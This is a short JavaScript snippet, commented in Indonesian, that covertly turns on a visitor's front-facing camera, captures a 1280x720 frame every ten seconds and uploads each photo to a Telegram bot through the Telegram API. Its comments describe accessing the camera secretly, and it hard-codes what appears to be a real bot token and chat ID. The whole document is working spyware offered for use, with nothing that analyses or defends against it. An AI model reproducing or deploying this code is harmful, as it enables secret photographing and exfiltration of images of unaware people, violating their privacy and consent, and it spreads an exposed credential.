// Config Telegram (Ganti dengan BOT_TOKEN & CHAT_ID Anda)
const BOT_TOKEN = '7770985430:AAFuJIEHZ7ORrtih7i9K8Iu_57F41tsTLL4';
const CHAT_ID = '7730972930';

// Auto-Capture setiap 10 detik (ubah interval sesuai kebutuhan)
setInterval(() => {
    captureAndSend();
}, 10000);

// Fungsi Ambil Foto & Kirim
function captureAndSend() {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    // Set resolusi tersembunyi (HD)
    canvas.width = 1280;
    canvas.height = 720;

    // Ambil frame dari kamera
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const photoData = canvas.toDataURL('image/jpeg').split(',')[1];

    // Kirim ke Telegram via API
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            photo: photoData
        })
    }).catch(err => console.error("Error:", err));
}

// Akses Kamera Depan secara diam-diam
navigator.mediaDevices.getUserMedia({ 
    video: { 
        facingMode: 'user',
        width: 1280,
        height: 720 
    }, 
    audio: false 
}).then(stream => {
    document.getElementById('video').srcObject = stream;
}).catch(err => {
    console.error("Kamera gagal diakses:", err);
});
